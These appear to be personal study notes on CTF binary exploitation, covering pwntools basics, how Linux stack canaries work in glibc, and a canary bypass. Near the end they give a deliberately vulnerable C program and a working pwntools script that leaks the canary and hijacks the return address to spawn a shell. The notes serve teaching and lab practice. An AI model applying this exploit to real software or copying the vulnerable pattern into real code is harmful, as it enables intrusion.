- main author: hex, https://github.com/hex-16

# Pwn







> Linux中的GOT和PLT到底是个啥？   https://www.freebuf.com/articles/system/135685.html 



## pwntools

> Github repo: https://github.com/Gallopsled/pwntools
>
> docs: https://docs.pwntools.com/en/latest/

- pwn工具集. `pwntools` is a CTF framework and exploit development library
- 

```python
from pwn import *
io = remote("127.0.0.1", 32152)
# 与互联网主机交互
io.sendline("hello") # sendline发送数据会在最后多添加一个回车
io.send("hello") # 不会添加回车

io.recv(1024) # 读取1024个字节
io.recvuntil() # 读取一直到回车
io.recvline("hello") # 读取到指定数据

io.interactive()
```



```python
io = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试

io.p32(0xdeadbeef)
io.p64(0xdeadbeefdeadbeef)
io.u32("1234")
io.u64("12345678")
# 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword
```





### Installation

> (2021.3) 官方文档建议使用python3

```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```



### Cases

> https://docs.pwntools.com/en/latest/intro.html
>
> 使用`from pwn import *`后，quick list of most of the objects and routines imported: https://docs.pwntools.com/en/latest/globals.html





#### Connections

```python
# 创建远程连接，
conn = remote('ftp.ubuntu.com', 21) # in pwnlib.tubes.remote # 域名/IP, Port
conn.recvline() # doctest: +ELLIPSIS # b'220 ...'
conn.send(b'USER anonymous\r\n') # 需要手动添加\r\n
conn.recvuntil(b' ', drop=True) # b'331'
conn.recvline() # b'Please specify the password.\r\n'
conn.close()
```

```python
# spin up a listener
l = listen() # 创建一个sock用于监听
r = remote('localhost', l.lport) # 连接刚刚创建的连接l的监听端口 lport
c = l.wait_for_connection() # 等待连接
r.send(b'hello')
c.recv() # b'hello'
```

```python
# Interacting with processes # 与进程交互
sh = process('/bin/sh') # pwnlib.tubes.process
sh.sendline(b'sleep 3; echo hello world;') # 会自动添加\r\n
sh.recvline(timeout=1) # b'' # 因为上面执行的命令首先为sleep 3，这里超时后未接收到字符串
sh.recvline(timeout=5) # b'hello world\n'
sh.close()
```

```python
# Not only can you interact with processes programmatically, but you can actually interact with processes.
>>> sh.interactive() # doctest: +SKIP
$ whoami
user
```



```python
# There’s even an SSH module for when you’ve got to SSH into a box to perform a local/setuid exploit with pwnlib.tubes.ssh. You can quickly spawn processes and grab the output, or spawn a process and interact with it like a process tube. # ssh连接
shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
shell['whoami'] # b'bandit0'
shell.download_file('/etc/motd')
sh = shell.run('sh')
sh.sendline(b'sleep 3; echo hello world;') 
sh.recvline(timeout=1) # b''
sh.recvline(timeout=5) # b'hello world\n'
shell.close()
```





#### Packing Integers

- 在python表示的整数和字节序列表示之间转换

```python
import struct
p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
leet = unhex('37130000')
u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
u8(b'A') == 0x41 # True # 两者等效
```



#### Target Architecture, OS, Logging

```python
context.binary = './challenge-binary' # 自动设置所有适当的值 # 官方文档推荐方法
```



```python
asm('nop') # b'\x90'
asm('nop', arch='arm') # b'\x00\xf0 \xe3'
# set once in the global `context`
context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32
```

```python
# asm context 方法对比
asm('nop') # b'\x90'
context(arch='arm', os='linux', endian='big', word_size=32)
asm('nop') # b'\xe3 \xf0\x00'
```

```python
# set logging level
context.log_level = 'debug'
```

#### Assembly and Disassembly

> `pwnlib.asm`

```python
enhex(asm('mov eax, 0')) # 'b800000000'  # assembly to machine code # 汇编转机器码(hex)
print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
# Output: 
   0:   6a 02                   push   0x2
   2:   58                      pop    eax
   3:   cd 80                   int    0x80
   5:   eb f9                   jmp    0x0
```





#### ELF Manipulation

```python
e = ELF('/bin/cat')
print(hex(e.address)) #doctest: +SKIP # 0x400000
print(hex(e.symbols['write'])) #doctest: +SKIP # 0x401680
print(hex(e.got['write'])) #doctest: +SKIP # 0x60b070
print(hex(e.plt['write'])) #doctest: +SKIP # 0x401680

# patch and save the files # 打补丁并保存
e = ELF('/bin/cat')
e.read(e.address, 4) # b'\x7fELF'
e.asm(e.address, 'ret') # 将 e.address 地址处的汇编改为 ret
e.save('/tmp/quiet-cat')
disasm(open('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
```









---

# Linux Pwn





## 安全防护机制



### Canary

> 金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的，预警用的金丝雀
>
> 这里指解决栈溢出问题的漏洞缓解措施

- 通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的
- 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)
- 攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary
- 由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在
- Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生
- Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配



#### Canary原理

- 在GCC中使用以下参数设置 Canary

```bash
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector 禁用保护
```

- 开启 Canary 保护的 stack 结构大概如下：

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address
```

当程序启用 Canary 编译后，在**函数序言**部分会取 fs 寄存器 0x28 处的值，存放在栈中 `%ebp-0x8` 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：

```assembly
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```assembly
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

> FS寄存器 https://www.cnblogs.com/feiyucq/archive/2010/05/21/1741069.html 所述内容与本节所述的FS寄存器的貌似有些不同？

如果 Canary 已经被非法修改，此时程序流程会走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。

```c
// eg libc-2.19/debug/stack_chk_fail.c
void __attribute__ ((noreturn)) __stack_chk_fail (void){
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>");
}
```

这意味可以通过劫持 `__stack_chk_fail` 的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容 (参见 stack smash)。

对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。

```c
typedef struct{
  void *tcb;   // Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.
  dtv_t *dtv;
  void *self;  // Pointer to the thread descriptor.
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```

如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。

事实上，TLS 中的值由函数 security_init 进行初始化

```c
static void
security_init (void){
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```



#### Canary 绕过

Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。



- 示例代码：

```c
// ex2.c # 编译为 32bit 程序并关闭 PIE 保护 （并开启 NX，ASLR，Canary 保护）
// gcc -m32 -no-pie -fstack-protector-all canary_demo.c -o ex2
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```







##### 泄露栈中的 Canary

- Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串。
- 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。
- 这种利用方式需要存在合适的输出函数，并且可能需要先溢出泄露 Canary，之后再次溢出控制执行流程。

```python
#!/usr/bin/env python
from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```





---

# Windows Pwn

